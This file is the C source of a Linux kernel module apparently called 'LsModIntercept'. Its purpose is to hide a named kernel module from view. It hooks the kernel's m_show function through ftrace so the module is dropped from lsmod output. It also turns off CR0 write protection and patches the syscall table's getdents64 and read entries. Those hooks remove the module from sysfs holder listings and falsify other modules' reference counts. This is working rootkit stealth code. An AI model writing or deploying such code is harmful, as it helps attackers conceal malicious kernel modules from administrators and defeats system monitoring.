#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/ftrace.h>
#include <net/inet_sock.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <stdbool.h>

// Function prototype
void m_show_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
void module_refcount_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);

// Types & other consts.
static char *mod_name_to_hide;
module_param(mod_name_to_hide, charp, 0);

static unsigned long *syscall_table; 
static char *sys_modules_path = "/sys/module/";
static char *module_name = "LsModIntercept";


// get_dents64 hook
typedef int (*original_getdents64_t)(const struct pt_regs *regs);
static original_getdents64_t original_getdents64_ptr;
static char *holders_path = "/holders";

// read hook
typedef ssize_t  (*original_read_t)(const struct pt_regs *regs);
static original_read_t original_read_ptr;
static char *refcount_path = "/refcnt";

// m_show hook
typedef int (*original_m_show_t)(struct seq_file *seq, void *v);
static unsigned long m_show_address; 
static original_m_show_t original_m_show_ptr;
static struct ftrace_ops m_show_ops = { .func = m_show_callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY };

static inline void wp_cr0(unsigned long val) {
    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
}
static inline void zero_cr0(void) {
    printk(KERN_ALERT "Unprotecting mem!");
    wp_cr0(read_cr0() & (~0x10000));
}

static inline void one_cr0(void) {
    printk(KERN_ALERT "Protecting mem...");
    wp_cr0(read_cr0() | 0x10000);
}

char* get_file_path_from_file_struct(struct file *file) {
    char *path;
    path = kmalloc(PATH_MAX, GFP_KERNEL);
    path = d_path(&file->f_path, path, PATH_MAX);

    return path;
}

/* Does a already use b?
   Copied from module.c, as that function is not exported. */
int already_uses(struct module *a, struct module *b)
{
	struct module_use *use;

	list_for_each_entry(use, &b->source_list, source_list) {
		if (use->source == a) {
			return 1;
		}
	}
    
	return 0;
}

ssize_t new_read(const struct pt_regs *regs) {
    int bytes_read = original_read_ptr(regs);
    struct file *file = fget((int)regs->di);
    if (file == NULL) {
        return bytes_read;
    }

    char *path = get_file_path_from_file_struct(file);
        
    if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, refcount_path) != NULL) && bytes_read > 0) {
        char *current_module_name = file->f_path.dentry->d_parent->d_iname;
        if (!strcmp(mod_name_to_hide, current_module_name)) {
            return bytes_read;
        }

        mutex_lock(&module_mutex);
        struct module *module_to_hide = find_module(mod_name_to_hide);
        struct module *current_module = find_module(current_module_name);
        mutex_unlock(&module_mutex);

        int does_use_hidden_module = already_uses(module_to_hide, current_module);
        if (does_use_hidden_module) {
            printk("Removing from used by...");

            int refcount = module_refcount(current_module);
            if (refcount > 0) {
                int new_refcount = refcount - 1;

                void *buf_pointer = (void*)regs->si;
                char *new_value = kmalloc(bytes_read, GFP_KERNEL);
                sprintf(new_value, "%d\n", new_refcount);
                copy_to_user(buf_pointer, new_value, bytes_read);

                return bytes_read;       
            }
        }
        
    }

    return bytes_read;
}

int new_getdents64(const struct pt_regs *regs) {
    int total_bytes_read = original_getdents64_ptr(regs);
    void *buff_pointer = (void*)regs->si;

    bool has_been_found = false;
    void *first;

    if (total_bytes_read > 0) {
        first = kmalloc(total_bytes_read, GFP_KERNEL);

        int copy_res = copy_from_user((void *)first, buff_pointer, (unsigned long)total_bytes_read);
        if (copy_res) {
            printk(KERN_ALERT "Error while copying from user space! error %d", copy_res);
            return total_bytes_read;
        }

        struct linux_dirent64 * curr = first;

        int i = 0;
        while ((i < total_bytes_read) && (curr->d_reclen > 0)) {   
            curr = first + i;

            struct file *file = fget((int)regs->di);
            char *path = get_file_path_from_file_struct(file);
            if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, holders_path) != NULL) && (!strcmp(curr->d_name, mod_name_to_hide))) {
                printk(KERN_ALERT "Hiding %s from %s", mod_name_to_hide, path);    
                has_been_found = true;
                int length_to_copy = total_bytes_read - i - curr->d_reclen;

                // Array has been shortened by the length of the member we've just deleted.
                total_bytes_read -= curr->d_reclen;
                
                void *next_pos = first + i + curr->d_reclen;
                memmove((void*)curr, next_pos, length_to_copy);
                continue;
            }

            i += curr->d_reclen;
        }
    }

    if (has_been_found) {
        copy_to_user(buff_pointer, first, total_bytes_read);
    }

    return total_bytes_read;
}

int new_m_show(struct seq_file *m, void *p) {
    struct module *mod = list_entry(p, struct module, list);
    if (!strcmp(mod->name, mod_name_to_hide)) {
        printk(KERN_ALERT "Hiding %s", mod->name);
        return 0;
    }

    return original_m_show_ptr(m, p);
}

void notrace m_show_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs) {
    // To prevent an infinite loop.
    if (!within_module(parent_ip, THIS_MODULE)) {
        regs->ip = (long unsigned int)new_m_show;
    }
}
 
int load(void) {
    if (mod_name_to_hide == NULL) {
        printk("Mod name to hide has not been set! Exiting...");
        return -1;
    }

    printk(KERN_ALERT "Initializing...");
    m_show_address = kallsyms_lookup_name("m_show");
    if (!m_show_address) {
        printk(KERN_ALERT "Failed to find m_show!");            
        return 0;
    }
    printk(KERN_ALERT "m_show found %lu", m_show_address);
    original_m_show_ptr = (original_m_show_t)m_show_address;
    ftrace_set_filter_ip(&m_show_ops, (unsigned long)original_m_show_ptr, 0, 0);
    register_ftrace_function(&m_show_ops);

    zero_cr0();
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
    syscall_table[__NR_getdents64] = (unsigned long)new_getdents64;
    printk(KERN_ALERT "Overrided getdents64 ptr!");

    original_read_ptr = (original_read_t)syscall_table[__NR_read];
    syscall_table[__NR_read] = (unsigned long)new_read;
    printk(KERN_ALERT "Overrided read ptr!");
    one_cr0();
    printk(KERN_ALERT "Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    printk(KERN_ALERT "Shutting down.");
    unregister_ftrace_function(&m_show_ops);

    zero_cr0();
    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64_ptr;  
    printk(KERN_ALERT "getdents64 has been restored!");

    syscall_table[__NR_read] = (unsigned long)original_read_ptr;
    printk(KERN_ALERT "read has been restored!");
    one_cr0();
    printk(KERN_ALERT "Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");